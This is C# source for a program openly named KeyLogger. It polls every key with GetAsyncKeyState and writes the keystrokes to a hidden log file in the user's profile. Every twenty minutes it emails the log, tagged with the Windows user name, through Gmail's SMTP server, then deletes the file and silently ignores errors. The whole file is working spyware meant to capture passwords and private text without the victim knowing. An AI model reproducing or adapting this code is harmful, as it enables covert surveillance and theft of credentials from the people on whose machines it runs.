using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Timers;

namespace KeyLogger
{
    class Program
    {
        private string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Log.txt";

        private Dictionary<int, string> KeysDictionary = new Dictionary<int, string>()
        {
            { 1, "[PRIMARY MOUSE BUTTON]" },
            { 2, "[SECONDARY MOUSE BUTTON]" },
            { 4, "[MOUSE WHEEL BUTTON]" },
            { 8, "[BACK]" },
            { 9, "[TAB]" },
            { 13, "[ENTER]" },
            { 16, "[SHIFT]" },
            { 17, "[CTRL]" },
            { 18, "[ALT]" },
            { 19, "[PAUSE/BREAK]" },
            { 20, "[CAPS LOCK]" },
            { 27, "[ESC]" },
            { 32, "[SPACE]" },
            { 33, "[PAGE UP]" },
            { 34, "[PAGE DOWN]" },
            { 35, "[END]" },
            { 36, "[HOME]" },
            { 37, "[LEFT ARROW]" },
            { 38, "[UP ARROW]" },
            { 39, "[RIGHT ARROW]" },
            { 40, "[DOWN ARROW]" },
            { 44, "[PRINT SCREEN]" },
            { 45, "[INSERT]" },
            { 46, "[DELETE]" },
            { 48, "0" },
            { 49, "1" },
            { 50, "2" },
            { 51, "3" },
            { 52, "4" },
            { 53, "5" },
            { 54, "6" },
            { 55, "7" },
            { 56, "8" },
            { 57, "9" },
            { 65, "a" },
            { 66, "b" },
            { 67, "c" },
            { 68, "d" },
            { 69, "e" },
            { 70, "f" },
            { 71, "g" },
            { 72, "h" },
            { 73, "i" },
            { 74, "j" },
            { 75, "k" },
            { 76, "l" },
            { 77, "m" },
            { 78, "n" },
            { 79, "o" },
            { 80, "p" },
            { 81, "q" },
            { 82, "r" },
            { 83, "s" },
            { 84, "t" },
            { 85, "u" },
            { 86, "v" },
            { 87, "w" },
            { 88, "x" },
            { 89, "y" },
            { 90, "z" },
            { 91, "[LEFT WINDOWS]" },
            { 92, "[RIGHT WINDOWS]" },
            { 93, "[LIST]" },
            { 96, "NumPad 0" },
            { 97, "NumPad 1" },
            { 98, "NumPad 2" },
            { 99, "NumPad 3" },
            { 100, "NumPad 4" },
            { 101, "NumPad 5" },
            { 102, "NumPad 6" },
            { 103, "NumPad 7" },
            { 104, "NumPad 8" },
            { 105, "NumPad 9" },
            { 106, "*" },
            { 107, "+" },
            { 109, "-" },
            { 110, "," },
            { 111, "/" },
            { 112, "[F1]" },
            { 113, "[F2]" },
            { 114, "[F3]" },
            { 115, "[F4]" },
            { 116, "[F5]" },
            { 117, "[F6]" },
            { 118, "[F7]" },
            { 119, "[F8]" },
            { 120, "[F9]" },
            { 121, "[F10]" },
            { 122, "[F11]" },
            { 123, "[F12]" },
            { 144, "[NUM LOCK]" },
            { 145, "[SCROLL LOCK]" },
            { 160, "[SHIFT]" },
            { 161, "[SHIFT]" },
            { 162, "[CTRL]" },
            { 163, "[CTRL]" },
            { 164, "[ALT]" },
            { 165, "[ALT]" },
            { 186, "ç" },
            { 187, "=" },
            { 188, "," },
            { 189, "-" },
            { 190, "." },
            { 191, ";" },
            { 192, "'" },
            { 193, "/" },
            { 194, "." },
            { 219, "´" },
            { 220, "]" },
            { 221, "[" },
            { 222, "~" },
            { 226, "\\" }
        };

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {
            new Program().start();
        }

        private void start()
        {
            if (File.Exists(path)) File.SetAttributes(path, FileAttributes.Hidden);
            Timer t = new Timer();
            t.Interval = 60000 * 20;
            t.Elapsed += sendEmail;
            t.AutoReset = true;
            t.Enabled = true;

            while (true)
            {
                for (int i = 0; i < 255; i++)
                {
                    int key = GetAsyncKeyState(i);
                    if (key != 0)
                    {
                        StreamWriter file = new StreamWriter(path, true);
                        File.SetAttributes(path, FileAttributes.Hidden);
                        file.Write(verifyKey(i));
                        file.Close();
                        break;
                    }
                }
            }
        }

        private string verifyKey(int code)
        {
            return KeysDictionary.ContainsKey(code) ? KeysDictionary[code] : "[" + code + "]";
        }

        private void sendEmail(object source, ElapsedEventArgs e)
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient server = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress("email");
                mail.To.Add("dest");
                mail.Subject = "Log: " + WindowsIdentity.GetCurrent().Name;

                if (!File.Exists(path)) return;
                StreamReader r = new StreamReader(path);
                string content = r.ReadLine();
                r.Close();
                File.Delete(path);
                mail.Body = content;

                server.Port = 587;
                server.Credentials = new NetworkCredential("email", "password");
                server.EnableSsl = true;
                server.Send(mail);
            }
            catch (Exception ex)
            {
            }
        }
    }
}